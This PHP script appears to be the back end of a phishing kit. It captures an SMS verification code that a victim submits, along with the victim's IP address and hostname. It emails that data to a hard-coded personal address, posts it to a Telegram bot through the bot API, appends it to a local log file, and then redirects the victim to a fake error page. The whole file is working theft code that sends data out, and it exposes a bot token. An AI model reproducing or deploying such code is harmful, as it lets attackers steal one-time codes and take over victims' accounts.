<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "------- SMS 1 -------\n";
$message .= "SMS             : ".$_POST['tel']."\n";
$message .= "------- IP -------\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= "------------------\n";
$send = "machinoumohamed@yandex.com";
$subject = "SMS| $ip ";
$headers = "From:SMS 2 <don@mox.fr>";
mail($send,$subject,$message,$headers);
 $Txt_Rezlt = fopen('tiim.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "1471281489:AAEbxSXQjFX1LdEi7zJ66aZxCOVHbS7EDbg";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1497188295&text=" . urlencode($message)."" );
$file = fopen("tiim.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: ./error-msg.php");

?>